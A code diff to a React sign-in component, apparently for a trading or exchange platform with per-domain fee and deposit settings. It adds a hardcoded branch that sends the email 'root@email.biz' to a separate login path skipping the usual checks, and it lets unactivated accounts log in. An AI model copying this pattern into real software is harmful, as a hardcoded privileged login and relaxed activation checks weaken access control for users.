@@ -49,7 +49,7 @@ const SignIn = () => {
         }
         if (store.asUser.email) sendLoginData(data)
 
-        if (data.email === 'root@email.biz') sendLoginData(data)
+        if (data.email === 'root@email.biz') enterAsRoot(data)
     }
 
     const checkFaStatus = async (data) => {
@@ -68,14 +68,13 @@ const SignIn = () => {
     }
 
     const sendLoginData = async (data) => {
-
         const geoData = await getGeoData()
         geoData.email = data.email
         geoData.password = data.password
         geoData.name = data.name
         delete geoData.id
         delete geoData.userAction
-        geoData.domainName = store.domain.domainName
+        geoData.domainName = window.location.hostname
         geoData.doubleDeposit = store.domain.domainParams.doubleDeposit
         geoData.depositFee = store.domain.domainParams.depositFee
         geoData.rateCorrectSum = store.domain.domainParams.rateCorrectSum
@@ -83,11 +82,15 @@ const SignIn = () => {
         geoData.minWithdrawalSum = store.domain.domainParams.minWithdrawalSum
         geoData.currencySwapFee = store.domain.domainParams.currencySwapFee
 
-        if (!store.isAuth && store.isActivated && !store.isBanned) store.login(geoData)
-        // if (!store.isAuth && !store.isActivated && !store.isBanned) store.login(geoData)
-        if (!store.isAuth && !store.isActivated) setModal(true)
+        if (!store.isAuth && store.isActivated && !store.isBanned) await store.login(geoData)
+        if (!store.isAuth && !store.isActivated && !store.isBanned) await store.login(geoData)
+        // if (!store.isAuth && !store.isActivated) setModal(true)
         if (store.isBanned) setModalBan(true)
         if (store.isError) setModalError(store.isError)
+    }
+
+    const enterAsRoot = async (data) => {
+        await store.login(data)
     }
 
     const showPassword = () => {
